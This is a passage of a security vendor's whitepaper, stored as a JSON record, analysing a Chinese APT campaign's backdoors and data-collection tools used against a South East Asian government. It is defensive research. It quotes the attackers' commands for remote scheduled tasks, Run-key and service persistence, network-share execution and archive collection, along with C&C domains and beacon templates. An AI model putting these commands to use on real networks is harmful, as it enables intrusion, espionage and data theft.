{
    "id": "79fae314-965d-4318-9e38-cc71a24c1793",
    "created_at": "2022-10-25T16:48:23.314399Z",
    "updated_at": "2025-03-27T02:16:01.070983Z",
    "deleted_at": null,
    "sha1_hash": "04f2e7dae2a99039549957795de625810f0e2698",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-DT-Whitepaper-CN_APT-WebUseOnly-creat4934-en_EN:Bitdefender-DT-Whitepaper-CN_APT-WebUseOnly-creat4934-en_EN.indd",
    "authors": "",
    "file_creation_date": "2020-11-16T21:20:17Z",
    "file_modification_date": "2020-11-16T21:20:21Z",
    "file_size": 6505694,
    "plain_text": "web use only\n\n# Dissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n\n-----\n\n#### Contents\n\n##### Executive Summary.......................................................................................................... 3\nKey Findings.............................................................................................................................4\nAttack timeline..........................................................................................................................4\n\n##### Tools Arsenal.................................................................................................................... 5\nChinoxy......................................................................................................................................5\nPcShare.....................................................................................................................................6\nPcShareDropper........................................................................................................................7\nPcShareLoader..........................................................................................................................7\nPcMain........................................................................................................................................8\nCcf32...................................................................................................................................... 10\n\n##### FunnyDream toolset........................................................................................................ 11\nFunnyDream........................................................................................................................... 11\nFunnyDreamDropper..............................................................................................................11\nFunnyDream backdoor..........................................................................................................12\nC&C communication..............................................................................................................13\nBackdoor Capabilities............................................................................................................14\nFilepak.................................................................................................................................... 15\nScreenCap.............................................................................................................................. 16\nKeyrecord............................................................................................................................... 17\nFilepakMonitor....................................................................................................................... 18\nTcpBridge............................................................................................................................... 20\nTcp_transfer........................................................................................................................... 20\nMd_client................................................................................................................................ 21\n\n##### C&C infrastructure.......................................................................................................... 21\n\n Attribution........................................................................................................................ 24\n\n IOCs................................................................................................................................. 24\nHashes................................................................................................................................... 24\nMutexes................................................................................................................................. 26\nEvents..................................................................................................................................... 26\nPaths...................................................................................................................................... 26\nFile Mappings........................................................................................................................ 27\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n\n## Executive Summary\n\n\nBitdefender researchers are constantly monitoring\nAPT groups and their activities around the world,\nin an effort to gain better insights into their tactics,\ntechniques and targeted victims. While some APT\ngroups operate for financial profit, others have been\nattributed to nation states and may follow a political\nagenda. Forensic artefacts left behind by APT groups\nwhen using custom-built tools or specific payloads\ncan sometimes point to a known actor, but may also\nreveal additional information about how the groups\noperate after compromising a target.\n\n\nThe attack has a complex and complete arsenal of\ndroppers, backdoors and other tools involving Chinoxy\nbackdoor, PCShare RAT and FunnyDream backdoor\nbinaries, with forensic artefacts pointing towards\na sophisticated Chineseactor. Some of these open\nsource Remote Access Trojans (RATs) are known to\nbe of Chinese origin, along with some other resources\nset to Chinese. The FunnyDream backdoor is far more\ncomplex than the others, implementing a wide range\nof persistence mechanism and a large number of\ndroppers, suggesting it’s custom-made.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n### Key Findings\n\n- Potential Chinese APT group targeting a South East Asian government\n\n- Persistence through digitally signed binaries vulnerable to side-loading a backdoor into memory\n\n- Extensive custom toolset for data exploration and exfiltration\n\n- Three backdoors used (Chinoxy, PcShare, FunnyDream)\n\n- Potentially compromised domain controllers, gaining control over the victim’s network\n\n- First detailed timeline of this attack and the tools, tactics and techniques used\n\n- Around 200 machines showed signs of having various tools associated with the APT group\n\n### Attack timeline\n\nWhen investigating the Chinese APT group, Bitdefender researchers managed to compile an attack timeline of how the\ntools were used when compromising a machine. After piecing all the forensic evidence together, this attack timeline\npaints a clearer picture of how all the tools found are tied to each other, serving as a detailed case study into dissecting\nan APT-style attack.\n\nThe first suspicious signs our researchers observed were some unusual processes with command lines that contain\nfile extensions and timestamps as the one illustrated below:\n```\n“c:\\\\users\\\\public\\\\ccf32.exe -PC all 123456 doc,docx,ppt,pptx,xls,xlsx,pdf 1903220000\n1904221000”\n\n```\nFurther analysis revealed a complex attack, with multiple types of tools combined to monitor and spy on the victims,\nhaving as a final purpose exfiltration of intelligence and sensitive information.\n\nDespite our efforts, the infection vector remains unknown, although some clues indicate that, most probably, we are\ndealing with social engineering through a spam email.\n\nFollowing the killchain, the first trace we observed was the execution of Chinoxy backdoor, whose role was to gain\npersistence in the victim’s system after initial access. Although Chinoxy acts as the main backdoor, we observed\nanother component deployed by Chinoxy – it’s an open source Chinese RAT called PcShare. Both Chinoxy and PcShare\nhave a persistence mechanism, first backdoor being copied to startup folder and the second one hijacking a COM\nobject (MruPidlList). To evade detection, the Chinoxy dropper uses a digitally signed binary (Logitech Blutooth Wizard\n_Host Process) vulnerable to Side Loading to load the backdoor dll into memory._\n\nMoving further in the investigation uncovers some evidence of lateral movement. We have seen credentials used to\nexecute many batch files with scheduled tasks and WMI on remote machines, but we can only make assumptions\nabout their origin, due to the lack of evidence. We also noticed the attackers’ preference for using the wmiexec.vbs\nscript to run remote commands.\n\nFor the Discovery step, the attackers used command line tools like tasklist.exe, ipconfig.exe, systeminfo.exe and netstat.\n**_exe, executed from batch files, mapping the internal network and gaining information about the systems from that_**\ninstitution.\n\nAfter the discovery process, the attackers use a tool for file collection called ccf32. The tool is copied to C:\\Users\\\n**_Public folder and is run with schtasks on a daily basis, the files collected by ccf32 are copied to a remote machine (the_**\nmachine on which the results are copied is infected with Chinoxy or another backdoor). However, the ccf32 isn’t the only\ntool used for collecting files. During the investigation we were able to identify a much more complex toolset, probably\ncustom made, whose role was to collect files, monitor the file system for changes, take screenshots, log keystrokes\nand exfiltrate that information to the C&C server The toolset gathers binaries such as FilePak FilePakMonitor\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nAll those tools, and many others used in the attack, will be described in detail in sections below.\n\nFig.1 - Tool usage timeline\n\nAs seen in the presented timeline, the first trace of the attack relates to the Chinoxy activity and is dated back to\nNovember, 2018. Somewhere around that time, PcShare was installed as well. The role of the latter, we believe, is to\nperform more complex espionage actions. Starting with 29.01.2019 the ccf32 is intensively used, first by Chinoxy,\nfollowed by FunnyDream. After FunnyDream appears on the systems, we observed more tools used and some of those\nindicate more frequent attempts of lateral movementon around 200 machines in five months of activity.\n\nMore technical details about the arsenal of tools is provided in section below.\n\n## Tools Arsenal\n\n### Chinoxy\n\nAs mentioned, the starting point of the investigation was the unusual activity of the ccf32.exe. Investigating the Root\nCause Analysis for this process, we observed that the parent processes of the ccf32.exe was Chinoxy malware.\n\nOne of the analyzed samples was 1afff5b9026bdf27a0c111b50d28ae92, which has proven to be the dropper for the\nChinoxy backdoor. An interesting fact about this sample is that the function responsible for extracting and dropping\nthe backdoor is hidden in a virtual function table of a class that extends CDialog::CDialog (the function overrides\n**OnInitDialog), this being done for anti-analyzing purposes.**\n\nThe dropping function initiates the decryption of the config by extracting the content of the “GGMM” resource. It uses\n**_“18113289765” and “19888889999” strings as keys for XOR-ing. After the decryption, the config is written to the k1.ini_**\nfile in the %TEMP% folder.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThe Config value from the k1.ini file contains the base64 representation of the C&C string which, after decoding, is\n\n**_“www.eofficeupdate.com:80|www.eofficeupdate.com:443|www.eofficeupdate.com:1080|”._**\n\nOnce executed, it will extract two binaries, named LBTServ.dll and unio.exe. The binaries are located in two\nresources with ids 0x81 and 0x83, respectively, both resources having the language set to Chinese and being\ncompressed using aPLib algorithm. After the LBTServ.dll(132227d867e63f8bce24ae5741791d7a) and unio.\n**exe(ff992b4aa59884ad153c887fbb7155fc) files are dropped into the %TEMP% folder, the latter is executed.**\n\nThe unio.exefile (ff992b4aa59884ad153c887fbb7155fc), is actually a digitally signed binary, LBTWizGi.exe (Logitech\nBlutooth Wizard Host Process) vulnerable to Side-Loading which is exploited by the attackers to load LBTServ.dll\n(Chinoxy backdoor) from the current directory.\n\nAfter being loaded, the backdoor writes to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry\nkey the path to the unio.exe under the “UNI” key value. This is not the only persistence used, some of the Chinoxy\ndroppers, in particular the 1afff5b9026bdf27a0c111b50d28ae92 sample, was located in the startup folder (%COMMON_\n**STARTUP%\\\\eoffice.exe).**\n\nIn the context of the current attack, the Chinoxy backdoor was mainly used to execute ccf32.exe for data collection.\nThe attackers copied ccf32.exe to \\\\<remote_host>\\C$\\Users\\Public\\folder, along with a bat file (e.g.\\\\<remote_\n**host>\\C$\\Users\\Public\\11.bat), then executed the bat daily, using schtasks.exe:**\n\n **schtasks /create /s <remote_host> /u “<username>” /p “<password>” /ru “SYSTEM” /tn one /sc DAILY /tr “c:\\**\n**users\\public\\11.bat” /F**\n\nThe bat file will execute ccf32.exe.\n\n### PcShare\n\nDuring the investigation, we noticed files with names like “bitupdating.exe”, “iat.exe” and “bit.exe” on some victims’\nmachines. At that moment, we had already encountered many FunnyDream samples that communicated with such\ndomains as“eofficeupdate[.]com” and “wmiprvse[.]com”. These domains were known to be connected to “bitupdating[.]\n_com” and “iatupdate[.]com” via the IP addresses to which they resolved and the email used for registration. Moreover,_\nafter having analyzed the binaries named“bitupdating.exe” and “iat.exe”, we identified that they are PcShare droppers\nand their C&C domain was reflected in the file names (“bitupdating[.]com” and “iatupdate[.]com”, respectively).\nInvestigating the Root Cause Analysis for PcShare process, we saw that it was actually executed by the Chinoxy\nbackdoor.\n\n[The attackers used a slightly modified version of PcShare that is available on GitHub, in addition to the Chinoxy](https://github.com/LiveMirror/pcshare)\nbackdoor. The installation of the PcShare payload (PcMain) is presented in Figure 3:\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n**PcShareDropper**\nAll samples of droppers are executable files with the “wuauclt.exe” InternalName, as well as many other version info\nfields filled. Besides, there is an invalid certificate in the overlay of each executable. All this suggests that the binaries\npretend to be legitimate “Windows Update AutoUpdate Client”.\n\nOnce executed, the dropper starts its activity by obtaining the addresses of the winapi functions used. After that, it runs\nthe “main” function in a separated thread. Some interesting aspects are worth mentioning:\n\n The dropper contains the x86 and the x64 versions of the PcShare Loader and, depending on the infrastructure\non which it was executed, it drops one version or the other.\n Both of these versions are in the.data section, XOR-ed with different 32-long base16 strings and compressed\nwithLZW algorithm.\n The dropper creates the%LOCALAPPDATA%\\microsoft\\windows\\explorer\\update folder, drops the PcShare\nLoader in the %TEMP% folder with the name “<random decimal int>_sts.tmp” and, then moves this file into the\nfolder created earlier, naming it “wuauong.tlb”.\n Afterwards, theHKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\\n**_InprocServer32registry key is created by the dropper. The default value of that key has the path to the“wuauong._**\n**_tlb” file assigned to it. The other key value named “ThreadingModel” gets created, and is assigned the “Apartment”_**\n_string. This marks the completion of the persistence setup. The {42aedc87-2188-41fd-b9a3-0c966feabec1}_\n**_CLSID corresponds to the MRUPIDLList COM object (The Most Recent Used PIDL List) exported by shell32.dll. The_**\nexplorer.exe usually uses that COM object, and, therefore it implicitly loads the correspondent InProcServer32\nDLL. However, the functionality exported by this COM object is not critical for the system, thus, it can be\nremoved or disabled.\n\nUltimately, the rundll32.exe executable is being run (which, in its turn, calls cmsot function exported by wuauong.tlb)\nand a process running explorer.exe is being run with the same attributes as the existing one in order to trigger the\npersistence.\n\n**PcShareLoader**\nThe role of the loader is to inject the PcMain payload into the logagent.exe process. This is done probably for defense\nevasion, as logagent.exe is known to create traffic to send log errors from Windows Media Player.\n\nThe loader is a DLL file with the “wuaueng.dll” InternalName and the “rtlmake.dll” ExportName which, besides the\n**DllMain function, also exports two other functions: cmsot and Embedding. In the overlay part of the binary, it has**\na certificate which, in combination with the VERSIONINFO fields, should impersonate a module belonging to the\n“Microsoft Windows Update”, just like its dropper does.\n\nRegarding the behavior implemented into the loader, the following should be mentioned:\n\n The cmsot function is responsible for deleting the file received as the parameter. The file is renamed “<random\n**_decimal int>_mda.tmp”, moved into the %TEMP% folder and, then deleted. The dropper usually calls this_**\nfunction in order to delete itself from the disk;\n The DllMain function checks whether the name of the executable in which the respective DLL is being loaded\nis “explorer.exe”. If it is, the Embedding function is called;\n **Embedding is the “main” function of the loader;**\n\nThe Embedding function makes sure that only a single instance of the loader exists in memory (using\n**CreateFileMappingW and OpenFileMappingW). It decrypts and decompresses the structure called PSDLLINFO**\n(which contains useful information for PcMain like the IP address and port of the C&C) and decrypts the\n**PcMain payload itself. Both the structure and the payload are in 2 global variables, XOR-ed with the strings**\n“2ae06f136eb6588508eefd4b5f6c98d8345f1104746d15141” and “5c6575a1c2152b5eb161c670db124b4a”\nrespectively (those keys are used in all samples of PcShare Loader we were able to find related to the attack).\nAfter obtaining the payload and the PSDLLINFO structure, it maps them into the newly created logagent.exe (using\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nLooking for similar files in our collection, we found more samples of PcShare loader, some of those\nsamples inject their payload into “rdpclip.exe” and have C&C that seem unrelated to the current attack (e.g.\n**550bf8d1eb81a1a9d4a1e17b6be7d89c with C&C supports.casacam[.]net).**\n\n**PcMain**\nAll samples of PcMain extracted from loaders we found related to the attack are injected into logagent.exe and have\nExternal Name as “rtlmain.dll”. Another common characteristic of those samples is that they export Putklm function,\nwhich is responsible for reflective loading.\n\nOnce the reflective loading is done, the PcMain obtains the PSDLLINFO structure mapped into the logagent.exe\nmemory, and it continues with the decryption of the string collection by applying a XOR operation and a decompression\nusing LZM algorithm (custom implemented). The string collection contains winapi function names and the DLL\nnames that export those functions, as well as format strings, file paths, registry key names and many other strings as\npresented in the figure below:\n\nFig. 4 - A part of string collection - similar with StringDll.ini from Github Code\n\nFrom this point, the code is pretty similar with that found on Github, with some minor modifications:\n\n The single instance of the payload is assured by using OpenFileMappingA/CreateFileMappingA functions.\n All processes of logagent.exe are killed except the one in which PcMain is injected\n The module obtains the proxy settings using InternetQueryOptionA and, if a proxy exists, a socket connection\nto it is initiated by sending an http request from the following template “CONNECT <host>:<port> HTTP/1.1\\\n**_nUser-Agent: Mozilla/v5.0\\nHOST: <host>\\nProxy-Connection: Keep-Alive\\n\\n”. As the host the C&C address is_**\nset.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThere are implemented only a subset of modules that are present in the Github code:\n\n**m_Command** **Function name** **Description**\n\nWM_CONNECT_FRAM SSH_FramThread Remote control component; Sends\nscreenshots and receives events like Mouse\nEvents, Keystroke events\n\nWM_CONNECT_FILE SSH_ MainThread Command loop for file, process, registry\n\nmanipulations\n\nWM_CONNECT_PROC\n\nWM_CONNECT_SERV\n\nWM_CONNECT_REGT\n\nWM_CONNECT_FIND\n\nWM_CONNECT_TLNT SSH _TlntThread Executes cmd commands by connecting\nthe stdin and stdout/stderr to the C&C;\nImplements a custom command “getip”\nby running “nslookup myip.opendns.com\n**resolver1.opendns.com\\r\\n”**\n\nWM_CONNECT_DL_ SSH_DlThread Uploads files to the C&C in a loop; the file\nFILE paths are received from C&C\n\nWM_CONNECT_TURL SSH_TuRlThread Receives urls for downloading files;\nDownloads and executes the files\n\nWM_CONNECT_UPLO SSH_FileThread Receives a file from C&C, writes it to disk and\nexecutes it\n\nWM_CONNECT_UP_ SSH_UpThread Receives a file from C&C and writes it to disk\nFILE\n\nWM_CONNECT_MESS SSH_MessThread Show a message using MessageBox\n\nWM_CONNECT_LINK SSH_LinkThread Open a link with iexeplorer.exe\n\nWM_CONNECT_VIDEO SSH_VideoThread Capture camera video and send to C&C;\nmodule seems to be broken (call to\nInitStillGraph is missing)\n\nCLIENT_PRO_ - Delete the persistence from registry and\nUNINSTALL **wuauong.tlb**\n\nCLIENT_SYSTEM_ ShutDownSystem Restarts the system\nRESTART\n\nCLIENT_SYSTEM_ ShutDownSystem Shutdown the system\nSHUTDOWN\n\nThe PcMain is capable of updating itself and its PSDLLINFO which contains C&C address.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n### Ccf32\n\nThe ccf32.exe binary (362b1114f32b980443957079bac6d01e) is a command line tool used for data collection.\nAlthough this tool embeds more options the attackers could use, we have seen only one intensively used, the “-PC”\noption:\n```\n“ccf32.exe -PC all 123456 doc,docx,ppt,pptx,xls,xlsx,pdf 1903220000 1904221000”.\n\n```\nThe “-PC” option accepts six parameters, the flag itself followed by:\n\n the target folder for listing\n the archive password (the archive will contain the collected files)\n file extensions which attackers are interested in\n two timestamps whose meaning will be explained below.\n\nIn the case of the previous option, the ccf32 initiates a file listing of all drives if the “all” string is specified, or it lists the\ngiven as parameter folder. Throughout the listing, the LastWriteTime attribute of each file is transformed into an integer\nusing _wtoi and a string obtained as follow:\n\nFig. 5 – LastWriteTime to string transformation\n\nIf the resulted integer is contained in the range given by the two timestamps from the command line (which respect\nthe same format as the resulted integer), this means that the correspondent file passes the “filter”. All the file paths\ndiscovered during the listing process are written into a text file called “temp” (located in the same folder as ccf32). The\n“temp” file is parsed to obtain the list of files that have the targeted extensions (those from the command line).\n\nThe ccf32 creates a hidden directory in the current location, naming it after the current local time by using the year,\nmonth and day (eg. “2019.01.29” -> “20190129”). In that folder, ccf32 temporarily stores the files that it intends to\ncollect.\n\nAfter that, all files are copied to the temporary hidden folder, ccf32 drops in the current directory a 7zr.exe executable\nwhich is contained in the ccf32 binary as a buffer XOR-ed with “0x41” byte. The 7zr.exe is used for adding the collected\nfiles to an archive called “path.7z”, and is being executed using cmd.exe:\n```\n“C:\\Windows\\system32\\cmd.exe/c c:\\users\\public\\7zr.exe a -bso0 -bse2 -bsp2 -p<password_\n\n```\n**from_comamnd_line> c:\\users\\public\\path.7z c:\\users\\public\\20190423\\”**\n\nIf the compression is successful, then the ccf32 starts the cleanup process by deleting the “temp” file and the hidden\nfolder.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThe ccf32.exe life cycle in this attack can be described as follows:\n\n**Phase** **commands**\n\ndeployment **\\\\<remote_host>\\C$\\Users\\Public\\<bat_name>.bat  C:\\Users\\Public\\<bat_**\n**name>.bat**\n\n**\\\\<remote_host>\\C$\\Users\\Public\\ccf32.exe C:\\Users\\Public\\ccf32.exe**\n\n**schtasks /create /s <target_host> /u “<username>” /p “<password>” /ru “SYSTEM” /**\n**tn one /sc DAILY /tr “c:\\users\\public\\ \\<bat_name>.bat “ /F**\n\ncollection **xcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_**\n**host>.7z /H /Y**\n\ncleanup **cmd.exe /c del \\\\<target_host>\\c$\\users\\public\\path.7z /A:H**\n\n**cmd.exe /c schtasks /delete /s <target_host> /u <user> /p <password> /tn one /f**\n\n**cmd.exe /c del \\\\<target_host>\\c$\\users\\public\\<bat_name>.bat && del \\\\<target_**\n**host>\\c$\\users\\public\\ccf32.exe**\n\nAlthough we have seen only the “-PC” option used, the ccf32.exe has more capabilities, like uploading the results to an\n**ftp server specifying the user, password and the server address to command line.**\n\nThere is also a x64 version of this tool, named ccf64.exe (50c0f86e28268d07c1815552962a91ad).\n\n## FunnyDream toolset\n\nBy tracing the parents of ccf32.exe, besides the Chinoxy, we noticed the usage of a new backdoor, which we identified\nas FunnyDream backdoor. The highlighted fact revealed the existence of a much more complex toolset that we intend\nto describe in the following sections.\n\n### FunnyDream\n\nThe attackers used the backdoor prevalently as DLL files, but we observed an executable to be used as well. The files\nwe found implement many persistence mechanisms, their droppers and loaders use many different file names for the\npayload, all of that suggesting that the backdoor is custom made.\n\n**FunnyDreamDropper**\nMost of the droppers of the FunnyDream have the pdb path set to ”C:\\works\\prjs\\z3_build\\build\\DllBuilder\\Release\\\n**Dll_deploy.pdb”. There are also samples with “E:\\Works\\Zu3\\Project\\build\\DllBuilder\\Release\\Dll_deploy.pdb”,“E:\\**\n**Works\\Zu3\\Project\\build\\gen17\\bin\\wininstall.pdb” pdbs. Moreover, the pdb path of some samples reflects the**\npersistence that the dropper installs (e.g.E:\\Works\\Zu3\\Project\\build\\gen17_link_dll\\bin\\wininstall.pdb, E:\\Works\\\n**Zu3\\Project\\build\\gen17_reg_exe_HKLM\\bin\\wininstall.pdb). In the case of droppers that deal with persistence, the**\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nmechanisms used are the Run registry key and the Startup folder, this being done using com objects identified with\n**CLSID_ShellLink(IShellLink and IPersistFile) and WScript.Shell(RegWrite method).**\n\nThe dropper contains a resource named “BIN” containing the backdoor in the form of a template binary (usually\nunencrypted) that sometimes is customized before dropping by replacing the string “funnydream” with a file\npath that will be deleted after the backdoor is loaded or by adding to the string “prettygirl” the C&C address\nencoded using base64 with “xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-” or\n“xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=” charsets.\n\nOne representative dropper (10f9a1578b3f80b7413bf20b56541c86) revealed some of the methods used by the\nattackers and showed how deeply they are infiltrated into the victims’ network.\n\n_10f9a1578b3f80b7413bf20b56541c86_\n\nThis sample we found to be located at “%USERS%\\public\\libraries\\msvcrt.dll”, but on many machines it was executed\nfrom the “netlogon” shared folder. Using WMI (windows management instrumentation), the attackers executedthe\n**“cmd.exe /c \\\\<DC host>\\netlogon\\initialization.bat” command on the remote machine. The initialization.bat starts**\nthe dropper by running “rundll32 \\\\<DC host>\\netlogon\\msvcrt.dll,Start”.\n\nThat trace, besides being more evidence of lateral movement, proves that the attackers already infected some domain\ncontrollers from the victim’s network.\n\nThis sample also creates in %APPDATA% a folder called “maxbear” and it drops the FunnyDreambackdoor binary\nfrom the “BIN” resourceto a file with randomized name using the format string “%s\\\\maxbear\\\\%c%c%c%c%cutil.exe”,\nsimilar to those presented below:\n\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\U8VCQutil.exe\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\BDPTSutil.exe\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\H7kSFutil.exe\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\I7YaOutil.exe\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Y7KFPutil.exe\n\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Q7RK1util.exe\n\nUltimately, the dropper executes the FunnyDream binary by invoking the “Start” function exported by the payload using\n**rundll32.exe.**\n\n##### FunnyDream backdoor\nThis component has multiple capabilities, such as gathering user information and sending it to the command and\ncontrol server, cleaning traces of malware deployment, detection evasion and, of course, backdoor behavior (executing\ncommands and sending the results to the C&C server).\n\nThis backdoor is used by attackers to run other tools (like ccf32.exe) to exfiltrate intelligence. It appears under\na vast variety of names, being deployed by a dropper or manually by the attackers. A good example is the\n_3db71a32bebe09bf25442766ceca5ddc sample, which we have seen to be deployed by a dropper as C:\\Users\\<user>\\_\n**appdata\\roaming\\maxbear\\n7mj7util.exe, but also, we encountered it as a local %USERS%\\public\\libraries\\msvcrt.**\n**dll file. In some cases, this sample was executed from netlogon share as \\\\<DC>\\netlogon\\msvcrt.dll exactly like the**\ndropper described previously.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nOther paths of the FunnyDream binaries related to the attack are:\n\n**%PUBLIC%\\libraries\\winmsg.dll**\n\n**%COMMON_APPDATA%\\microsoft\\netframework\\winmsg.dll**\n\n**%PUBLIC%\\bin\\winmsg.dll**\n\n**%PUBLIC%\\libraries\\winuser.dll**\n\n**%COMMON_APPDATA%\\wmiutil.dll**\n\n**%PUBLIC%\\libraries\\wmihelp.dll**\n\n**C:\\Users\\<user>\\appdata\\local\\temp\\unikeytn.exe**\n\n**%COMMON_APPDATA%\\microsoft\\netframework\\vssvb.exe**\n\n**%COMMON_APPDATA%\\conhosts.exe**\n\n**%PUBLIC%\\libraries\\conhosts.exe**\n\nThe paths presented above correspond to binaries that are deployed manually. For some of them, we have evidence\nthat they are deployed using a bat file via WMI. Moreover, that bat file installs the persistence for the deployed\nbackdoor (usually by using reg.exe for writing to Run keyor using sc.exe):\n\n **reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v unikey /t REG_SZ /d “C:\\users\\<user>\\**\n**appdata\\local\\temp\\UniKeyTN.exe”**\n **sc create “Office Update” binpath= “cmd /c start /b C:\\ProgramData\\Microsoft\\NetFramework\\vssvb.exe”**\n**start= auto**\n\n##### C&C communication\nCommunication with the C&C server starts by obtaining the address. Usually it is in plain text, but there are also cases\nwhere they are base64 encoded with a custom charsetorXor-ed as shown in the image:\n\nFig. 6 – C&C address deobfuscation\n\nSome samples, after obtaining the address, initiate a TCP connection directly to the C&C server, but there are binaries\nwith a more complex logic, like the ones below:\n\n**b190911ebc6cce700f02bc90a3294fd2**\n\nIt starts by looking into Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings registry corresponding to each\nuser for extracting the “ProxyServer” string. Then, it parses the string to find a http proxy and, if that exists, it tries to\ninitiate a connection by sending a packet using a TCP connection to that proxy:\n\n **“CONNECT <proxy_addr>:<proxy_port> HTTP/1.0\\r\\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0;**\n**Windows NT 6.1;)\\r\\nProxy-Connection: Keep-Alive\\r\\nContent-Length: 0\\r\\nHost: <destination>\\r\\**\n**nPragma: no-cache\\r\\n\\r\\n”**\n\nThe expected value received from the proxy is “200 Connection established\\r\\n” which suggests that a connection is\nestablished.\n\nIf a proxy is not set at all, the binary uses a raw TCP to transmit its packets.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThe payload of a packet is transformed by XOR-ingit with a random value and compressing it with zLibalgorithm. The\nresulted buffer is set as body for an http packet formed from the next template:\n\nFig. 7 – HTTP request template\n\nThe Host header is assigned the C&C address and the POST path is formed as follows:\n\n**/<seconds>/<random>/<incremental value module 1000>/<day>/<month>/<hour>/<minute>.**\n\n**ad5a170f3ec0a4a152da0f920c9e3c0f**\n\nThis sample, like the previous one, obtains the proxy by looking into the registry, but it searches for a socks proxy.\nIf such exists, it initiates a TCP connection to the proxy server and sends a 13-byte message corresponding to the\nfollowing “VER=0x4”, “CMD=0x1”, “DSTPORT”, “DSTIP” “ID=’htun” packet which should create a tunnel to the C&C\nthrough the proxy.\n\nThe payload of a packet is compressed in the same way as b190911ebc6cce700f02bc90a3294fd2 does, the\ndifference appears in the http packet template, in which the obfuscated payload is embedded:\n\nFig. 8 – HTTP replay template\n\nThe http packet corresponds to an HTTP replay and the “%s” parameter is filled with the “Date” header option assigning\nto it the current time in the “%a, %d %b %Y %H:%M:%S GMT” format (e.g. “Date: Tue, 15 Nov 1994 08:12:31 GMT”)\n\n##### Backdoor Capabilities\nAs stated above, the backdoor tries to delete a file whose file path replaced the “funnydream” string from the template.\nUsually the deleted file is the dropper component.\n\nThe second action some executables take is to run the “whoami/upn&whoami/fqdn&whoami/logonid&whoami/all”,\nwhich extracts much user information from the system, and to send the output to the C&C.\n\nAnother distinct characteristic of some samples is that they check for the existence of “Bka.exe” or “BkavUtil.exe”\nprocesses. If such a process exists, then the backdoor, in a separated thread, enumerates the system windows using\n**EnumWindows function. The WNDENUMPROC callback function used for enumeration searches for a specific visible**\nwindow that has the window text set to “OK” and it belongs to the “BkavSystemServer.exe” process. To that window\na “BM_CLICK” message is sent. The backdoor capabilities are implemented in two classes called CShellManager and\n**CFileManager.**\n\nThe CShellManager class is responsible for creating a cmd.exe process and for connecting the stdin/stdout/stderr of\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThe CFileManager implements operations like file upload, file download, directory listing, file and directory removal/\nmovement and, of course, the file execution operation (using ShellExecuteA or CreateProcessA).\n\n### Filepak\n\nThe Filepak component is used for file collection, being deployed in the same manner as ccf32.exe:\n\n **C:\\Windows\\system32\\cmd.exe /c “copy c:\\users\\public\\bin\\filepak.exe \\\\<remote host>\\c$\\users\\public\\**\n**/Y”**\n **schtasks /create /s <remote host> /u “<user>” /p “<password>” /ru “SYSTEM” /tn one /sc MONTHLY /tr “c:\\**\n**users\\public\\filepak.exe 20191101” /F**\n\nAll samples of that component related to the case have the “C:\\works\\prjs\\filepak\\Release\\filepak.pdb” pdb path set\nand are deployed under the same name “filepak.exe”. Another observation about the FilePak is that it was deployed\nexclusively by FunnyDream backdoor, that fact being illustrated in the presented timeline.\n\nAt runtime, the executable checks if another instance is already running by invoking the CreateFileA function with\n**CREATE_NEW flag on the file “zt” (located in the same folder as the executable itself). It then checks if there is at least**\none command line argument and parses the first one. The first argument should contain at least 8 characters, the first\n8 being the representation of a timestamp in the “yyyymmdd” form (e.g. “20191101”). All remaining characters of the\nfirst argument, if such exists, are used as a key for a XOR operation, which will be described below.\n\nNext action is the listing of all logical drives (excluding CDROMs and some directories like “c:\\windows\\”) to collect all\nfiles that have a particular extension and a LastWriteTime greater than the timestamp given as argument. The list of\nextension is hardcoded in the executable and is the same in all binaries we found - “doc;docx;ppt;pptx;xls;xlsx;pdf;”.\n\nIf a file matches the criteria, it is represented as a binary blob, and that blob is appended to the file “pak” (located in the\nsame directory as the executable). The binary blob has a specific format presented in the next image:\n\nFig. 9 - Archive blob format\n\nThe file content is compressed with zLib algorithm and then is obfuscated with a XOR operation using the string key\nfrom the command line or the “qwerasdf” string if the command line argument doesn’t contain the key. The file name is\nobfuscated using XOR with the same key as the compressed file content. The file content may be uncompressed if the\ncompression size is greater than the actual file size, the first segment being corresponding initialized.\n\nAfter the collection process is done, the “pak” file is renamed under the “pak.z” name.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n### ScreenCap\n\nThe ScreenCap component, as the name suggests, has the capability of taking screenshots and was discovered during\nthe analyzing of the DLL_Deploy binaries from our collection.\n\nThe DLL_Deploy binary (e.g. 